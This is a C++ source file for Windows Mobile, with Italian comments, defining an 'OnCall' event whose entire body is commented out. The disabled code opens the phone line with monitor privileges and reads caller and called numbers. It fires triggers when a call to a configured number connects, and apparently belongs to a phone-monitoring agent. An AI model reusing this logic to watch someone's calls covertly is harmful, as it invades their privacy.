#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include <common_new\connmgr.h>
//#include <Connmgr_status.h>
//#include <Iptypes.h>
//#include <common_new\Iphlpapi.h>
//#include <tapi.h>
#include <common_new\pm.h>

DWORD WINAPI OnCall(LPVOID lpParam) {
/***
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	wstring number;
	int delay, iterations, curIterations = 0, waitDelay = 0;
	HLINEAPP hLineApp;
	HLINE hLineOpened = NULL;
	DWORD dwPhoneNumDevs = 0, dwApiVersion = TAPI_CURRENT_VERSION;
	LINEINITIALIZEEXPARAMS liep;
	LINEMESSAGE lineMess;
	UINT i;
	BOOL bConnected = FALSE;

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		number = conf->getString(L"number");
	} catch (...) {
		number = L"";
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	ZeroMemory(&liep, sizeof(liep));
	liep.dwTotalSize = sizeof(LINEINITIALIZEEXPARAMS);
	liep.dwOptions   = LINEINITIALIZEEXOPTION_USEEVENT;

	if (lineInitializeEx(&hLineApp, 0, NULL, TEXT("ExTapi_Lib"), &dwPhoneNumDevs, &dwApiVersion, &liep)) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	for (i = 0; i < dwPhoneNumDevs; i++) {
		LINEEXTENSIONID extensionID;
		ZeroMemory(&extensionID, sizeof(LINEEXTENSIONID));
		lineNegotiateAPIVersion(hLineApp, i, 0x00010003, TAPI_CURRENT_VERSION, &dwApiVersion, &extensionID);
	}

	LINECALLPARAMS lineCallParams;
	HCALL hCall = NULL;

	ZeroMemory(&lineCallParams, sizeof(lineCallParams));
	lineCallParams.dwTotalSize = sizeof(lineCallParams);
	lineCallParams.dwBearerMode = LINEBEARERMODE_VOICE;
	lineCallParams.dwAddressMode = LINEADDRESSMODE_DIALABLEADDR;
	lineCallParams.dwCallParamFlags = LINECALLPARAMFLAGS_IDLE;
	lineCallParams.dwMediaMode = 0;

	if (lineOpen(hLineApp, 0, &hLineOpened, dwApiVersion, 0, 0x100, LINECALLPRIVILEGE_MONITOR | 
		LINECALLPRIVILEGE_OWNER, LINEMEDIAMODE_INTERACTIVEVOICE | LINEMEDIAMODE_DATAMODEM, 
		&lineCallParams)) {
			lineShutdown(hLineApp);
			me->setStatus(EVENT_STOPPED);
			return 0;
	}

	DBG_TRACE(L"Debug - Call.cpp - Call event started\n", 5, FALSE);

	BYTE buffer[sizeof(LINECALLINFO) * 2];
	LPLINECALLINFO pCallInfo = (LPLINECALLINFO)buffer;

	pCallInfo->dwTotalSize = sizeof(buffer);

	// Attendiamo che arrivi o sia effettuata una chiamata
	LOOP {
		int now = GetTickCount();

		if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
			if (WaitForSingleObject(eventHandle, 0) == WAIT_OBJECT_0) {
				lineClose(hLineOpened);
				lineShutdown(hLineApp);

				me->setStatus(EVENT_STOPPED);
				DBG_TRACE(L"Debug - Call.cpp - Call clean stop\n", 5, FALSE);
				return 0;
			}

			continue;
		}

		// Attendiamo 200ms per l'arrivo del messaggio
		LONG lineResult = lineGetMessage(hLineApp, &lineMess, 200);

		if (lineResult == LINEERR_INVALAPPHANDLE) { // Proviamo a riaprire la linea
			// Se non ci riusciamo, stoppiamo l'evento
			if (lineOpen(hLineApp, 0, &hLineOpened, dwApiVersion, 0, 0x100, LINECALLPRIVILEGE_MONITOR | 
				LINECALLPRIVILEGE_OWNER, LINEMEDIAMODE_INTERACTIVEVOICE | LINEMEDIAMODE_DATAMODEM, &lineCallParams)) {
					lineShutdown(hLineApp);
					me->setStatus(EVENT_STOPPED);
					return 0;
			}
		}

		// In caso di errore, continuiamo
		if (lineResult < 0)
			continue;

		waitDelay += GetTickCount() - now;

		if (waitDelay >= delay  && curIterations < iterations) {
			waitDelay = 0;
			me->triggerRepeat();
			curIterations++;
		}

		// Chiamata appena chiusa
		if (lineMess.dwMessageID == LINE_CALLSTATE && lineMess.dwParam1 == LINECALLSTATE_DISCONNECTED && bConnected == TRUE) {
			bConnected = FALSE;
			me->triggerEnd();
			continue;
		}

		// Questo messaggio non ci interessa, vogliamo solo che chiamate connesse
		if (lineMess.dwMessageID != LINE_CALLSTATE || lineMess.dwParam1 != LINECALLSTATE_CONNECTED)
			continue;

		hCall = (HCALL)lineMess.hDevice; // Prendiamo l'handle della chiamata!

		if (lineGetCallInfo(hCall, pCallInfo)) 
			continue;

		// Vediamo se la chiamata e' in entrata o in uscita
		WCHAR *pwNumber = NULL;

		// In entrata
		if (pCallInfo->dwCallerIDFlags == LINECALLPARTYID_ADDRESS && pCallInfo->dwCallerIDOffset)
			pwNumber = (WCHAR *)(((BYTE *)pCallInfo) + pCallInfo->dwCallerIDOffset);

		// In uscita
		if (pCallInfo->dwCalledIDFlags == LINECALLPARTYID_ADDRESS && pCallInfo->dwCalledIDOffset)
			pwNumber = (WCHAR *)(((BYTE *)pCallInfo) + pCallInfo->dwCalledIDOffset);

		if (pwNumber == NULL)
			continue;

		// Le chiamate in uscita non hanno necessariamente il codice +XX quindi usiamo wcsstr()
		if (bConnected == FALSE && (number.empty() || wcsstr(pwNumber, number.c_str()))) {
			bConnected = TRUE;
			me->triggerStart();
			continue;
		}
	}

	me->setStatus(EVENT_STOPPED);
	***/
	return 0;
}
